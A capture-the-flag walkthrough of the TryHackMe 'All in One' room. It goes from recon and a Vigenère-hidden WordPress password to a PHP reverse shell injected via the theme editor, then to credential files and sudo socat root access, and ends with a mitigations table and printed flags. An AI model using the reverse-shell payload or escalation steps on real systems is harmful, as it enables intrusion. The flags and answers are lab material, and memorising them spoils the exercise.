# CTF Write-Up: [All in One](https://tryhackme.com/room/allinonemj)

> **Platform:** TryHackMe | **Difficulty:** Easy

---
## 🚩 Flags

<details>
<summary>User Flag</summary>

`THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}`

</details>

<details>
<summary>Root Flag</summary>

`THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}`

</details>

---

## 1. Reconnaissance

### Initial Nmap Scan

```
nmap <IP_ADDRESS> -vv -oN Nmap/Initial
```

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### Detailed Nmap Scan

```
nmap <IP_ADDRESS> -p 21,22,80 -A -vv -oN Nmap/Detailed
```

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 21 | FTP | vsftpd 3.0.5 | ⚠️ Anonymous login allowed |
| 22 | SSH | OpenSSH 8.2p1 | Ubuntu |
| 80 | HTTP | Apache 2.4.41 | Default Ubuntu page |

> Anonymous FTP login succeeded but the directory was empty. Noted as a potential upload vector.

---

## 2. Web Enumeration

### Directory Busting

```
gobuster dir  -u http://<IP_ADDRESS>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
```

```
/wordpress     (Status: 301)
/hackathons    (Status: 200)
```

---

### /hackathons — Credential Discovery

The page displayed:

> *"Damn how much I hate the smell of Vinegar :/ !!!"*

Page source revealed two HTML comments:

```
<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
```

#### Decoding — Vigenère Cipher

**Vinegar = Vigenère** — the page text is a direct cipher hint.

| | Value |
|---|---|
| **Ciphertext** | `Dvc W@iyur@123` |
| **Key** | `KeepGoing` |
| **Tool** | [CyberChef](https://cyberchef.io) → Vigenère Decode |
| **Plaintext** | `Try H@ckme@123` |

> ℹ️ Vigenère only shifts alphabet characters. `@` and `123` pass through unchanged — so the password is `H@ckme@123`.

---

### Directory Busting — WordPress

```
gobuster dir -u http://<IP_ADDRESS>/wordpress -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
```

```
/wp-content    (Status: 301)
/wp-includes   (Status: 301)
/wp-admin      (Status: 301)
```

Username `elyana` identified from Website.

---

## 3. Initial Access

### Login

```
URL:       http://<IP_ADDRESS>/wordpress/wp-admin
Username:  elyana
Password:  H@ckme@123
```

### Inject Reverse Shell via Theme Editor

**Appearance → Theme Editor → `404.php`** (Twenty Twenty theme)

Replace file contents with:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<TUN0_IP>/4444 0>&1'"); ?>
```

Click **Update File**.

### Catch the Shell

```bash
# Listener
nc -lvnp 4444

# Open in browser: `http://<IP_ADDRESS>/wordpress/wp-content/themes/twentytwenty/404.php`
```

### Stabilise the Shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

✅ Shell as **`www-data`**

---

## 4. Lateral Movement — www-data → elyana

### Step 1 — wp-config.php

```
cat /var/www/html/wordpress/wp-config.php | grep -i "DB_\|pass\|user"
```

```
define( 'DB_USER',     'elyana' );
define( 'DB_PASSWORD', 'H@ckme@123' );
```

SSH with these creds failed — the server uses key-based auth only.

### Step 2 — hint.txt

```
cat /home/elyana/hint.txt
```

```
Elyana's user password is hidden in the system. Find it ;)
```

### Step 3 — Grep /etc for elyana

```
grep -r "elyana" /etc/ 2>/dev/null
```

Suspicious result:

```
/etc/mysql/conf.d/private.txt
```

```
cat /etc/mysql/conf.d/private.txt
```

```
user:     elyana
password: E@syR18ght
```

### Step 4 — Switch User

```
su elyana
# Password: E@syR18ght
```

### User Flag

```
cat /home/elyana/user.txt
# base64 encoded — decode it:
echo "VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259" | base64 -d
```

> 🚩 `THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}`

---

## 5. Privilege Escalation — elyana → root

### sudo -l

```
sudo -l
```

```
(ALL) NOPASSWD: /usr/bin/socat
```

### Socat

`socat` can spawn a shell. Running it via sudo elevates directly to root:

```
sudo socat stdin exec:/bin/bash
```

```
whoami
# root
```

### Root Flag

```
cat /root/root.txt
echo "VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9" | base64 -d
```

> 🚩 `THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}`

---

## 6. Attack Chain

```
Nmap Scan
    └─► FTP (anonymous) + Apache + WordPress

/hackathons page
    └─► HTML comment → Vigenère cipher → H@ckme@123

WordPress wp-admin  (elyana : H@ckme@123)
    └─► Theme Editor → 404.php RCE → shell as www-data

wp-config.php + /etc/mysql/conf.d/private.txt
    └─► elyana : E@syR18ght → su elyana → user flag

sudo socat
    └─► root shell → root flag
```

---

## 7. Vulnerabilities & Mitigations

| # | Vulnerability | Impact | Mitigation |
|---|---|---|---|
| 1 | Encoded credentials in HTML comments | Password disclosure | Never embed credentials in source code |
| 2 | WordPress Theme Editor enabled | RCE as www-data | Add `define('DISALLOW_FILE_EDIT', true)` to wp-config.php |
| 3 | Password reuse across services | Credential stuffing | Use unique passwords per service |
| 4 | Plaintext creds in `/etc/mysql/conf.d/` | Lateral movement | Restrict file permissions; use a secrets manager |
| 5 | `sudo socat` with no password | Full root compromise | Never grant passwordless sudo on network/exec tools |

---

*All in One — TryHackMe | Rooted ✅*
